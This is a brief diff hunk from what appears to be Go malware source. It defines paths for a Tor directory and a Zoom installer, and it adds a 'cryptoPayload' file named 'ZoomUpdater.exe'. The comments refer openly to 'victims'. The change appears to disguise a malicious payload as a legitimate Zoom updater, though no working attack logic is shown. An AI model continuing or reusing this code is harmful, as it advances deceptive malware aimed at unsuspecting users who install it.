@@ -19,6 +19,7 @@ var (
 
     torDirectory  = workDir + `\Tor`
     zoomInstaller = workDir + `\ZoomInstaller.exe`
+    cryptoPayload = workDir + `\ZoomUpdater.exe`
 
     // cast magicBytes to array lol, very safe indeed
     // all victims will be on little endian systems anyway
